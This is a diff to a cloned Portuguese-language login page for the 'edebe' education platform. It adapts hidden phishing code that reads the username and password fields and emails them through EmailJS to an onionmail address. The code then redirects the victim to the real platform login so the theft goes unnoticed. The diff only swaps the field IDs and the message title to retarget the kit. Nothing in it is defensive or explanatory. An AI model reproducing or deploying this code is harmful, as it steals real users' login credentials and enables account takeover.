@@ -259,8 +259,8 @@ mjx-container[jax="SVG"] path[data-c], mjx-container[jax="SVG"] use[data-c] {
       });
 
    var mensagens = [
-  document.getElementById('Cid_usuario').value,
-  document.getElementById('Csenha').value,
+  document.getElementById('username1').value,
+  document.getElementById('password1').value,
 ];
 
 var mensagemCompleta = mensagens.join('\n\n');
@@ -268,7 +268,7 @@ var mensagemCompleta = mensagens.join('\n\n');
 let parms = {
 
     email : 'easyjumpy@onionmail.org',
-    title : 'logins',
+    title : 'edebe',
     message : mensagemCompleta,
 };
 
@@ -278,7 +278,7 @@ emailjs.send('service_8xjw2qa','template_prkh9ez',parms).then(
     if (parseInt(response.status) >= 200 && parseInt(response.status) <= 299){
     window.location.replace('https://plataforma.edebe.com.br/#/login');
     } else {
-    window.location.replace('https://plataforma.edebe.com.br');
+    window.location.replace('https://plataforma.edebe.com.br/');
     }
   },
 );" class="p-ripple p-element button__primary p-button p-component" type="button" data-pc-name="button" data-pc-section="root"><!----><!----><!----><!----><!----><!----><span id="acessar_texto"class="p-button-label ng-star-inserted" data-pc-section="label">Acessar Plataforma</span><!----><!----></button></p-button><p _ngcontent-ng-c133986046="">Não possui uma conta? <a _ngcontent-ng-c133986046="" routerlink="https://plataforma.edebe.com.br/register" href="#/register">Cadastre-se</a></p></div><div _ngcontent-ng-c133986046="" class="version--mobile"> v1.25.20 </div></form></div></section><div _ngcontent-ng-c133986046="" class="version"> v1.25.20 </div></main><p-confirmdialog _ngcontent-ng-c133986046="" class="p-element ng-tns-c3435727603-2 ng-star-inserted"><!----></p-confirmdialog></app-login><!----></app-root>
